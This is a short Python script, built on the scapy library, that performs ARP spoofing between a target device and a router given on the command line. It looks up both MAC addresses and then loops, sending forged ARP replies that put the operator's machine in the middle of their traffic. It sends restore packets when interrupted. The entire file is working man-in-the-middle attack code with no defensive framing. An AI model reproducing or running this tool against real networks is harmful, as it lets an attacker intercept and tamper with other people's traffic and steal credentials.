from scapy.all import *
import time
import sys
import optparse
from packet_craft import *

# 

# getting arguments
parser = optparse.OptionParser()
parser.add_option('-i', dest='target_ip', help="enter the target device's IP address")
parser.add_option('-r', dest='router_ip', help="enter the router's IP address")
(options, arg) = parser.parse_args()

if not options.router_ip:
    print("please provide router's IP address")
    sys.exit()

if not options.target_ip:
    print("please provide target's IP address")
    sys.exit()

# getting the MAC address of the target computer
def get_mac(ip):
    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    answer = srp(arp_broadcast, verbose=False)
    print( answer[0][0][1].hwsrc)
    return answer[0][0][1].hwsrc

def arp_spoof(target_ip, spoofed_ip):
    # get MAC address of the target 
    target_mac = get_mac(target_ip)
    arp_spoof_packet = ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoofed_ip)
    send(arp_spoof_packet, verbose=0)

# prepare a packet to restore the original ARP table once the attack is over
def restore_ARP(target_ip, spoofed_ip):
    target_MAC = get_mac(target_ip)
    router_MAC = get_mac(spoofed_ip)
    arp_restore_packet = arp_packet(hwsrc=router_MAC, hwdst=target_MAC, psrc=spoofed_ip, pdst=target_ip, op=2 )
    send(arp_restore_packet, verbose=0)

try:
    while 1:
        arp_spoof(options.router_ip, options.target_ip)
        arp_spoof(options.target_ip, options.router_ip)
except KeyboardInterrupt:
    restore_ARP(options.router_ip, options.target_ip)
    restore_ARP(options.target_ip, options.router_ip)

